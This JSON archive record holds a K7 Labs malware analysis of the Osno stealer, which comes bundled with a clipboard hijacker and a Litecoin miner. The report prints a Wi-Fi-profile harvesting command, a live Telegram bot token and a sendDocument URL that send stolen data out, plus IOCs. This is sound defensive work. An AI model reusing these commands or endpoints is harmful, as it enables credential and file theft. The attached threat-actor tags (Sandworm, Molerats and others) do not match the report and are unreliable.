{
    "id": "4bb88b13-9dca-4bf6-bd66-48978ee4c1ad",
    "created_at": "2023-01-12T15:07:13.506824Z",
    "updated_at": "2025-03-27T02:14:39.042306Z",
    "deleted_at": null,
    "sha1_hash": "2ebcbf000211537508434bbd350d9fea6f0d1423",
    "title": "2021-01-28 - Osno – A Stealer and a Miner in One",
    "authors": "",
    "file_creation_date": "2022-05-28T17:50:28Z",
    "file_modification_date": "2022-05-28T17:50:28Z",
    "file_size": 1730028,
    "plain_text": "# Osno – A Stealer and a Miner in One\n\n**labs.k7computing.com/**\n\nBy K7 Labs January 28, 2021\n\nIn the earlier days, threat actors used to create malware for a specific job. For instance, ransomware.\nHowever, these days threat actors have started creating malware which are versatile. Here, in this blog we\nwill be explaining about one such malware, Osno, which is both a Stealer and a Miner.\n\nOsno Recovery Tool/Stealer steals browser data, wallet details, captures screenshot of system and grabs\ndetails of installed programs. Earlier this year, Osno stealer when downloaded installed both a rootkit and\nits ransomware on the victim’s system. Here, we will be getting into the nuances of an archive file\n“Steam_Machine_Checker.rar” which can be downloaded from the site\nhxxps[:]//www[.]upload[.]ee/files/12701875/Steam_Machine_Checker[.]rar[.]html and comes bundled with\nOsno stealer, BTC Clipboard Hijacker along with a Coinminer.\n\n\n-----\n\n_Figure 1:_\n\n_Malware Download_\nSteam is a digital store for purchasing, downloading and playing video games. “Steam Machine Brute\nForce Checker” is a hacktool for brute forcing passwords for Steam Engine. The author tries to lure illegal\ngame users into downloading this tool bundled with malware.\n\nAfter execution of the Steam_Machine_Checker.exe, it opens the GUI screen of “Steam Machine Brute\nForce checker” in the frontend and starts its malicious activity in the backend.\n\n\n-----\n\n_Figure 2: SteamBruteForce&Checker GUI_\n\n_Figure 3:_\n\n_Process Flow_\n_SteamMachine.exe executes service.exe and then SteamMachineService.exe which are not malicious by_\nthemselves.\n\n\n-----\n\n_Figure 4: Files found in_\n\n_SteamMachine/config Folder_\n\n**Persistence**\n\nUpdate.exe creates Run entry for persistence in the\n“HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” registry location and points to the file in\n“%AppData%\\Roaming\\scvhost\\scvhostservice.exe“. Scvhostservice.exe initiates svchost.exe which in turn\ndoes coin mining.\n\n_Figure 5: Autostart Entry for Malware_\n\n**Clipboard Hijacker**\n\nCtfmom.exe and _CL_02f3a8c9sy is dropped in “%Appdata%/Roaming/Microsoft” by config.exe.\n\n_CL_02f3a8c9sy has base64 encoded data.\n\n_Figure 6: ctfmom.exe – Clipboard_\n\n_Hijacker_\n[It gets the current Clipboard using Clipboard.GetText( ). If the hash in currentClipboard starts with ‘1’ it](https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.clipboard.gettext?view=net-5.0)\n[replaces it with 1LrPUuoopchKbfkJYLEwk2YWqBh6ZakTxX using Clipboard.SetText( ).](https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.clipboard.settext?view=net-5.0)\n\n**Clipboard.GetText – Retrieves text data from the Clipboard.**\n\n**Clipboard.SetText – Clears the Clipboard and then adds text data to it.**\n\nA common user may not notice any change while pasting for a BTC transaction. Hackers will succeed in\ngetting bitcoins using such transactions (wrong transaction for the user).\n\n\n-----\n\n_Figure 7: Code containing Clipboard Hijacker_\n\n_Figure 8: Code containing_\n\n_Malware Author’s BTC Address_\nThis transaction ID has been actively receiving Bitcoins by abusing clipboard. Some users have reported\nthe replacement of their hash with the malware author’s hash in the same site.\n\n_Figure 9: Bitcoin Transaction for_\n\n_1LrPUuoopchKbfkJYLEwk2YWqBh6ZakTxX_\n\n**Osno Stealer**\n\nConfigs.exe starts MsBuild.exe for stealer activity. MSBuild.exe steals bookmarks (for finding victim’s\npreferred site which could be internet banking or bitcoin transaction site), wallets, list of running process\n(using tasklist.exe), hardware and software installed – Anti-Virus, firewall etc., which is kept in the temp\nfolder with MD5 (username)/MD5 (machinename).\n```\n‘\"cmd.exe\" /C chcp 65001 && netsh wlan show profile | findstr All’\n\n```\nis used for viewing Wireless AutoConfig Service profile and converting to UTF-8 format and the list of\nBitcoin wallet searched: Zcash, Armory, Bytecoin, Ethereum, Exodus, Electrum, Coinomi, Guarda, Atomic,\nLitecoin, Dash, Bitcoin.\n\nIt also downloads CommandCam.exe from\n[hxxp[:]//raw[.]githubusercontent[.]com/tedburke/CommandCam/master/CommandCam[.]exe](http://raw.githubusercontent.com/tedburke/CommandCam/master/CommandCam.exe)\n\nfor capturing screenshots of the system.\n\nThe screenshot is saved as screen.jpg\n\n\n-----\n\n_Figure 10: Stealer_\n\n_Data in Temp Folder_\nSignature.txt, created by MSBuild.exe, is found in temp directory has the string “Osno Recovery Tool\nversion 2.1.5”\n\n_Figure 11: Contents in Signature.txt_\n\nHardware & Soft.txt created by MSBuild.exe also has the string “OsnoStealer WifiFucker v2” and other\ndetails like Firewall, Anti-Virus, Timezone, Country, and HWID.\n\n_Figure 12:_\n\n_Contents in Hardware & Soft.txt_\nMSBuild.exe also gets a list of all the stored files present in each directory. It is then stored in the subfolder\n‘Dirs’ as Desktop.txt, Documents.txt, Downloads.txt, OneDrive.txt, Pictures.txt, Startup.txt, Temp.txt and\nVideos.txt.\n\n_Figure 13:_\n\n_Stealer data in Directory Structure_\n[It then sends the stolen data in temp via telegram using ‘sendDocument’ of Telegram Bot API. This method](https://core.telegram.org/bots/api)\nis used to send general files.\n\n\n-----\n\n**sendDocument**\n\nsendDocument (chat_id, document)\n\nUse this method to send general files. On success, the sent message is returned. Bots can currently send\nfiles of any type of up to 50 MB in size, this limit may be changed in the future.\n\n**Parameter** **Type** **Required** **Description**\n\n\nchat_id Integer\nor String\n\ndocument InputFile\nor String\n\n\nYes Unique identifier for the target chat or username of the target\nchannel (in the format @channelusername)\n\nYes File to send. Pass a file_id as String to send a file that exists on the\nTelegram servers (recommended), pass an HTTP URL as a String\nfor Telegram to get a file from the Internet, or upload a new one\nusing multipart/form-data. More info on Sending Files\n\n\n**Botid: 1357457986:AAERrY18oy4DDObaDW6NeWL5QjSOphXAuyA**\n\n**Chat_id: 1171937559**\n\nhxxp[:]//api[.]telegram[.]org/bot1357457986:AAERrY18oy4DDObaDW6NeWL5QjSOphXAuyA/sendDocument?\nchat_id=1171937559&amp;caption=☠ **Brought you by Osno 2.1.5** ☠\n\n_Figure 14: Malicious Network Activity Captured_\nMalware process path is stored as base64 encoded in %Temp%/gpustats.bx path.\n\n_Figure 15: gpustats.bx found in temp_\n\n**Coinminer**\n\nAlong with the stealer and BTC Clipboard Hijacking, it also does coin mining. The files seen in Figure 16\nare dropped by update.exe which is responsible for coin mining.\n\n\n-----\n\n_Figure 16: Coinminer_\n\n_dropped in Roaming\\scvhost_\n[Coinminer programs namely DiabloMiner, found in the Cursor Library files are from open source code.](https://github.com/Diablo-D3/DiabloMiner)\n[Other Cursor Libraries are derived from poclbm project.](https://github.com/Eropi4/cgminer_keccak)\n\n**Control Logic** **Open Source Code** **Author**\n\ndiablo130302.cl DiabloMiner Con Kolivas, Patrick McFarland\n\ndiakgcn121016.cl poclbm project\n\nphatk kernel Phateus\n\nDiabloMiner kernel DiabloD3\n\nphatk121016.cl poclbm project Con Kolivas\n\npoclbm130302.cl poclbm project Con Kolivas\n\nscrypt130511.cl Con Kolivas\n\nSvchost.exe dropped in AppData\\Roaming\\scvhost does coinminer activity. Svchost.exe is a legitimate\ncoinmining file given malicious parameters by the threat actors to do their illegal work.\n\n_Figure_\n\n_17: Fake svchost.exe contacting litecoinpool_\n\n\n-----\n\nLitecoin, as shown in Figure 17, is a purportedly technical improvement of Bitcoin that is capable of faster\nturnarounds via its Scrypt mining algorithm (Bitcoin uses SHA-256). The Litecoin Network is able to\nproduce 84 million Litecoins—four times as many cryptocurrency units issued by Bitcoin.\n\nmining.subscribe(“user agent/version”, “extranonce1”)\n\nmining.authorize(“username”, “password”)\n\n_Figure 18: Coinmining_\n\n_Packet_\nOsno stealer not only keeps evolving its techniques and code to stay undetected but also comes bundled\nwith coinminer and BTC Clipboard Hijacker for malware author’s direct monetary benefit. Users are\nadvised not to download and install hacking tool software from untrusted sites, which might actually be a\ntrap laid out for them. It is also recommended to double check the hash while doing a BTC transaction. We\nat K7 detect all such malicious files. Users are advised to install a reputable security product like “K7 Total\n**Security” and keep it updated to stay safe from the latest threats.**\n\n## Indicators Of Compromise (IOCs)\n\n**MD5** **File Name** **K7 Detection Name**\n\n12CB317972BD329289FBC8B7CD289E67 configs.exe Trojan ( 005756931 )\n\n29516F4747ABB49E2085B64376A89F2E update.exe Trojan ( 005756931 )\n\n998D4888B99734C60802F93FB2DAF940 ctfmom.exe Trojan ( 00558e791 )\n\n29516F4747ABB49E2085B64376A89F2E scvhostservice.exe Trojan ( 005756931 )\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-01-28 - Osno – A Stealer and a Miner in One.pdf"
    ],
    "report_names": [
        "2021-01-28 - Osno – A Stealer and a Miner in One.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "1162e0d4-b69c-423d-a4da-f3080d1d2b0c",
            "created_at": "2023-01-06T13:46:38.508262Z",
            "updated_at": "2025-03-27T02:00:02.851407Z",
            "deleted_at": null,
            "main_name": "Molerats",
            "aliases": [
                "Gaza Hackers Team",
                "Gaza cybergang",
                "Gaza Cybergang",
                "Operation Molerats",
                "Extreme Jackal",
                "ALUMINUM SARATOGA",
                "G0021",
                "BLACKSTEM"
            ],
            "source_name": "MISPGALAXY:Molerats",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "0c502f6d-640d-4e69-bfb8-328ba6540d4f",
            "created_at": "2022-10-25T15:50:23.756782Z",
            "updated_at": "2025-03-27T02:00:55.539397Z",
            "deleted_at": null,
            "main_name": "Molerats",
            "aliases": [
                "Molerats",
                "Operation Molerats",
                "Gaza Cybergang"
            ],
            "source_name": "MITRE:Molerats",
            "tools": [
                "MoleNet",
                "DustySky",
                "DropBook",
                "SharpStage",
                "PoisonIvy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "847f600c-cf90-44c0-8b39-fb0d5adfcef4",
            "created_at": "2022-10-25T16:07:23.875541Z",
            "updated_at": "2025-03-27T02:02:10.005591Z",
            "deleted_at": null,
            "main_name": "Molerats",
            "aliases": [
                "ATK 89",
                "Aluminum Saratoga",
                "Extreme Jackal",
                "Gaza Cybergang",
                "Gaza Hackers Team",
                "Molerats",
                "Operation DustySky",
                "Operation DustySky Part 2",
                "Operation Molerats",
                "Operation Moonlight",
                "Operation SneakyPastes",
                "Operation TopHat",
                "TA402",
                "TAG-CT5"
            ],
            "source_name": "ETDA:Molerats",
            "tools": [
                "BadPatch",
                "Bladabindi",
                "BrittleBush",
                "Chymine",
                "CinaRAT",
                "Darkmoon",
                "Downeks",
                "DropBook",
                "DustySky",
                "ExtRat",
                "Gen:Trojan.Heur.PT",
                "H-Worm",
                "H-Worm RAT",
                "Houdini",
                "Houdini RAT",
                "Hworm",
                "Iniduoh",
                "IronWind",
                "Jenxcus",
                "JhoneRAT",
                "Jorik",
                "KasperAgent",
                "Kognito",
                "LastConn",
                "Micropsia",
                "MoleNet",
                "Molerat Loader",
                "NeD Worm",
                "NimbleMamba",
                "Njw0rm",
                "Pierogi",
                "Poison Ivy",
                "Quasar RAT",
                "QuasarRAT",
                "SPIVY",
                "Scote",
                "SharpSploit",
                "SharpStage",
                "WSHRAT",
                "WelcomeChat",
                "Xtreme RAT",
                "XtremeRAT",
                "Yggdrasil",
                "dinihou",
                "dunihi",
                "njRAT",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536033,
    "ts_updated_at": 1743041679,
    "ts_creation_date": 1653760228,
    "ts_modification_date": 1653760228,
    "files": {
        "pdf": "https://archive.orkl.eu/2ebcbf000211537508434bbd350d9fea6f0d1423.pdf",
        "text": "https://archive.orkl.eu/2ebcbf000211537508434bbd350d9fea6f0d1423.txt",
        "img": "https://archive.orkl.eu/2ebcbf000211537508434bbd350d9fea6f0d1423.jpg"
    }
}